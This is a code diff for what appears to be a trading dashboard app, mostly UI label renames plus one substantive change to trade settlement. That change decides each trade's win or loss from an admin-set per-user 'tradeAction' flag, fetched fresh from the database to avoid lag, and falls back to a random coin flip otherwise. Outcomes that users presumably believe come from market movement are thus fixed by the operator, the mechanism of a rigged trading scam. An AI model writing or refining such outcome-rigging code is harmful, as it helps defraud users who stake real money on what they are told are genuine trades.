@@ -441,10 +441,24 @@ export default function Dashboard({ user, profile, refreshProfile }: DashboardPr
     if (!tradeDetailsRef.current || !user) return;
     const { amount, seconds, symbol } = tradeDetailsRef.current;
     
-    // Determine win state based on admin control
-    const isWin = profile?.tradeAction !== undefined 
-      ? profile.tradeAction 
-      : Math.random() > 0.5;
+    // Determine win state based on admin control. Fetch freshest settings directly to bypass any lag
+    let isWin = Math.random() > 0.5;
+    try {
+      const freshDoc = await getDoc(doc(db, "users", user.uid));
+      if (freshDoc.exists()) {
+        const freshData = freshDoc.data();
+        if (freshData.tradeAction !== undefined) {
+          isWin = freshData.tradeAction;
+        }
+      } else if (profile?.tradeAction !== undefined) {
+        isWin = profile.tradeAction;
+      }
+    } catch (e) {
+      console.warn("Failed to retrieve fresher tradeAction control, falling back to cached profile.", e);
+      if (profile?.tradeAction !== undefined) {
+        isWin = profile.tradeAction;
+      }
+    }
 
     // Get return percentage based on duration
     const durationObj = ASSET_DURATIONS.find(d => d.s === seconds);
@@ -1302,8 +1316,8 @@ export default function Dashboard({ user, profile, refreshProfile }: DashboardPr
                        <Lock className="w-6 h-6" />
                     </div>
                     <div>
-                       <div className="font-bold text-slate-900 text-sm">Vault Access</div>
-                       <div className="text-[10px] text-slate-400 font-medium">Update security credentials</div>
+                       <div className="font-bold text-slate-900 text-sm">Change Password</div>
+                       <div className="text-[10px] text-slate-400 font-medium">Update account security credentials</div>
                     </div>
                   </div>
                   <ChevronRight className="w-5 h-5 text-slate-400 group-hover:translate-x-1 transition-transform" />
@@ -1378,7 +1392,7 @@ export default function Dashboard({ user, profile, refreshProfile }: DashboardPr
             { id: "home", icon: Home, label: "Home" },
             { id: "trading", icon: BarChart2, label: "Market" },
             { id: "news", icon: Bell, label: "News" },
-            { id: "personal", icon: UserIcon, label: "Vault" },
+            { id: "personal", icon: UserIcon, label: "You" },
           ].map((item) => (
             <button
               key={item.id}
